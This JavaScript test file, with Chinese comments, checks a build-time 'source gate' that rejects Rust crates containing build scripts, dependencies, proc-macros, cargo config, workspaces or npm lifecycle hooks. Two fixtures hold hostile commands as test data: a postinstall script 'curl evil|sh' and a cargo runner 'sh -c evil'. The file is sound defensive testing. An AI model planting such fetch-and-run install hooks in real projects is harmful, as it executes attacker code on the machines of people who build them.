// 闸 0 源码预检 —— 编译期执行点的拒绝集。
import assert from "node:assert/strict";
import test from "node:test";
import { SourceGateError, sourceGate } from "../dist/index.js";

/** 内存文件系统：每个用例手写一份最小源码树。 */
function memFs(files) {
  const keys = Object.keys(files);
  return {
    exists: (p) => keys.some((k) => k === p || k.startsWith(p + "/")),
    readText: (p) => {
      if (files[p] === undefined) throw new Error(`missing ${p}`);
      return files[p];
    },
    list: () => keys,
  };
}

const MINIMAL_RUST = {
  "Cargo.toml":
    '[package]\nname = "m"\nversion = "1.0.0"\nedition = "2021"\n\n[lib]\ncrate-type = ["cdylib"]\n',
  "rust-toolchain.toml": '[toolchain]\nchannel = "1.95.0"\n',
  "src/lib.rs": "#![no_std]\n",
};

test("最小合法 Rust 源码通过，并报告逐条检查项", () => {
  const r = sourceGate("rust", memFs(MINIMAL_RUST));
  assert.equal(r.language, "rust");
  for (const c of [
    "no-build-script",
    "no-dependencies",
    "not-proc-macro",
    "no-cargo-config",
    "single-crate",
  ]) {
    assert.ok(r.checks.includes(c), `缺检查项 ${c}`);
  }
});

const RUST_REJECTIONS = [
  ["build.rs 文件", { ...MINIMAL_RUST, "build.rs": "fn main(){}" }, "build-script"],
  [
    "[package].build 指定脚本",
    { ...MINIMAL_RUST, "Cargo.toml": MINIMAL_RUST["Cargo.toml"] + 'build = "custom.rs"\n' },
    "build-script",
  ],
  [
    "[build-dependencies]",
    { ...MINIMAL_RUST, "Cargo.toml": MINIMAL_RUST["Cargo.toml"] + '\n[build-dependencies]\ncc = "1"\n' },
    "build-script",
  ],
  [
    "非空 [dependencies]",
    { ...MINIMAL_RUST, "Cargo.toml": MINIMAL_RUST["Cargo.toml"] + '\n[dependencies]\nserde = "1"\n' },
    "dependencies",
  ],
  [
    "平台相关依赖",
    {
      ...MINIMAL_RUST,
      "Cargo.toml": MINIMAL_RUST["Cargo.toml"] + '\n[target.wasm32-unknown-unknown.dependencies]\nx = "1"\n',
    },
    "dependencies",
  ],
  [
    "proc-macro crate",
    { ...MINIMAL_RUST, "Cargo.toml": MINIMAL_RUST["Cargo.toml"] + "\nproc-macro = true\n" },
    "proc-macro",
  ],
  [
    ".cargo/config.toml",
    { ...MINIMAL_RUST, ".cargo/config.toml": '[target.wasm32-unknown-unknown]\nrunner = "sh -c evil"\n' },
    "cargo-config",
  ],
  [".cargo/config（无扩展名）", { ...MINIMAL_RUST, ".cargo/config": "x" }, "cargo-config"],
  [
    "[workspace] 多成员",
    { ...MINIMAL_RUST, "Cargo.toml": MINIMAL_RUST["Cargo.toml"] + '\n[workspace]\nmembers = ["a"]\n' },
    "workspace",
  ],
  [
    "package.json 带 scripts",
    { ...MINIMAL_RUST, "package.json": '{"scripts":{"postinstall":"curl evil|sh"}}' },
    "npm-lifecycle",
  ],
  ["夹带 node_modules", { ...MINIMAL_RUST, "node_modules/x/index.js": "" }, "npm-lifecycle"],
  ["缺 Cargo.toml", { "src/lib.rs": "" }, "layout"],
];

for (const [label, files, reason] of RUST_REJECTIONS) {
  test(`拒绝（Rust）：${label}`, () => {
    let thrown;
    try {
      sourceGate("rust", memFs(files));
    } catch (e) {
      thrown = e;
    }
    assert.ok(thrown instanceof SourceGateError, `${label} 未被拒绝`);
    assert.equal(thrown.reason, reason, `${label} 原因码不符：${thrown.message}`);
  });
}

test("dev-dependencies 不参与 release 构建，放行", () => {
  const files = {
    ...MINIMAL_RUST,
    "Cargo.toml": MINIMAL_RUST["Cargo.toml"] + '\n[dev-dependencies]\nx = "1"\n',
  };
  assert.ok(sourceGate("rust", memFs(files)));
});

test("注释里出现 build = 不误判", () => {
  const files = {
    ...MINIMAL_RUST,
    "Cargo.toml": MINIMAL_RUST["Cargo.toml"] + '# build = "x.rs" 这是说明\n',
  };
  assert.ok(sourceGate("rust", memFs(files)));
});

test("仓内真实源码过闸 0（正例，防止闸把自己人挡了）", async () => {
  const { nodeSourceFs } = await import("../dist/index.js");
  assert.ok(sourceGate("rust", nodeSourceFs("modules/available-inventory-rust")));
});
